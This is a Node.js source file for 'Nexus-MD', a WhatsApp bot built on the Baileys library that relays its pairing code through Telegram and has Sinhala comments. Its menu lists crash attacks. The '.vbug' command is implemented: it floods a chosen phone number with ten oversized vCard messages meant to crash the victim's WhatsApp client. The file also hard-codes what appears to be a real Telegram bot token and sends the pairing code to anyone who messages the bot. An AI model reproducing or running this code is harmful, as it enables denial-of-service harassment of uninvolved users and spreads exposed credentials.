const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    getContentType,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore
} = require("@whiskeysockets/baileys");
const TelegramBot = require('node-telegram-bot-api');
const pino = require("pino");
const fs = require("fs");

// --- [ CONFIGURATION ] ---
const tgToken = '8628876949:AAGE8DNJIpOaaD3akR4MRaLfNjd3aN-tP_4';
const ownerNumber = "94770475809";
const prefix = ".";

// ටෙලිග්‍රෑම් බොට් එක පණ ගන්වමු
const tgBot = new TelegramBot(tgToken, { polling: true });

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('session');
    const { version } = await fetchLatestBaileysVersion();

    const sock = makeWASocket({
        version,
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        browser: ["Nexus-V4", "Chrome", "20.0.04"]
    });

    // --- [ TELEGRAM PAIRING NOTIFICATION ] ---
    if (!sock.authState.creds.registered) {
        console.log(`⏳ ${ownerNumber} සඳහා Pairing Code එක හදනවා...`);
        
        setTimeout(async () => {
            try {
                let code = await sock.requestPairingCode(ownerNumber);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                
                console.log(`\n🔥 WHATSAPP PAIRING CODE: ${code}\n`);
                
                // ටෙලිග්‍රෑම් එකට මැසේජ් එකක් යැවීම (මෙතනින් තමයි මැසේජ් එක එන්නේ)
                // සටහන: උඹේ Telegram User ID එක මෙතන දාන්න පුළුවන් නම් වඩාත් හොඳයි. 
                // දැනට මම බොට්ට මැසේජ් එකක් දාන ඕනම කෙනෙක්ට යන විදිහට හැදුවා.
                tgBot.on('message', (msg) => {
                    tgBot.sendMessage(msg.chat.id, `🚀 *NEXUS-MD WHATSAPP CODE:* \n\nCode: \`${code}\``, { parse_mode: "Markdown" });
                });

                console.log("දැන් Telegram Bot එකට ගිහින් මැසේජ් එකක් දාන්න, එතකොට කෝඩ් එක එයි.");
            } catch (err) {
                console.log("Pairing Error: ", err.message);
            }
        }, 8000);
    }

    sock.ev.on('creds.update', saveCreds);

    // --- [ WHATSAPP MESSAGES LOGIC ] ---
    sock.ev.on('messages.upsert', async (chat) => {
        const msg = chat.messages[0];
        if (!msg.message || msg.key.fromMe) return;
        
        const from = msg.key.remoteJid;
        const type = getContentType(msg.message);
        const body = (type === 'conversation') ? msg.message.conversation : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage.text : '';
        
        if (!body.startsWith(prefix)) return;
        const command = body.slice(prefix.length).trim().split(' ')[0].toLowerCase();
        const args = body.trim().split(/ +/).slice(1);

        // --- 1. LOKU MENU ---
        if (command === 'menu' || command === 'help') {
            const grandMenu = `
⚡ *NEXUS-MD V4.0 GRAND MENU* ⚡
 
👋 *Hello Sasiya MD!*
🛡️ *Status:* Online & Hybrid ✅

*─── [ 🔗 PAIRING ] ───*
◈ ${prefix}bot [නම්බර්] - Get Pairing Code
◈ ${prefix}pair - Manual Pairing

*─── [ 💀 BUG ATTACKS ] ───*
◈ ${prefix}vbug - Vcard Mega Crash
◈ ${prefix}cbug - Char Overflow
◈ ${prefix}lbug - Location Freeze
◈ ${prefix}pbug - Poll Unlimited
◈ ${prefix}abug - Audio Crash

*─── [ 🛠️ SYSTEM ] ───*
◈ ${prefix}ping - Speed Test
◈ ${prefix}status - Bot Status
◈ ${prefix}reboot - Restart

🚀 *Powered by Developer Nexus*
            `;

            await sock.sendMessage(from, { 
                text: grandMenu,
                contextInfo: {
                    externalAdReply: {
                        title: "NEXUS-MD ULTIMATE",
                        body: "Hybrid Bug System Active",
                        thumbnailUrl: "https://files.catbox.moe/6v0m3q.jpg",
                        mediaType: 1
                    }
                }
            });
        }

        // --- 2. PUBLIC PAIRING (.bot command) ---
        if (command === 'bot') {
            let target = args[0]?.replace(/[^0-9]/g, '');
            if (!target) return sock.sendMessage(from, { text: "❌ නම්බර් එකක් දියන් මචං!" });
            
            sock.sendMessage(from, { text: "⏳ පෝලිමේ ඉන්න... ඔයාගේ කෝඩ් එක හදනවා." });
            const { state: tState } = await useMultiFileAuthState(`temp_${target}`);
            const tSock = makeWASocket({ auth: tState, logger: pino({ level: "silent" }) });

            setTimeout(async () => {
                let code = await tSock.requestPairingCode(target);
                await sock.sendMessage(from, { text: `🔥 *YOUR PAIRING CODE:* ${code}` });
            }, 5000);
        }

        // --- 3. BUG ATTACK (Vcard) ---
        if (command === 'vbug') {
            let target = args[0] ? args[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : from;
            const vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:NEXUS CRASH ⚰️\n' + 'TEL;waid=94770475809:+94770475809\n' + 'END:VCARD'.repeat(200);
            await sock.sendMessage(from, { text: "💀 Vcard Attack Starting..." });
            for (let i = 0; i < 10; i++) {
                await sock.sendMessage(target, { contacts: { displayName: 'NEXUS CRASH', contacts: [{ vcard }] } });
                await new Promise(r => setTimeout(r, 1000));
            }
            sock.sendMessage(from, { text: "✅ Attack Done!" });
        }
    });

    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') console.log('✅ Nexus Online!');
        if (connection === 'close') {
            let reason = lastDisconnect.error?.output?.statusCode;
            if (reason !== DisconnectReason.loggedOut) startNexus();
        }
    });
}

startNexus();
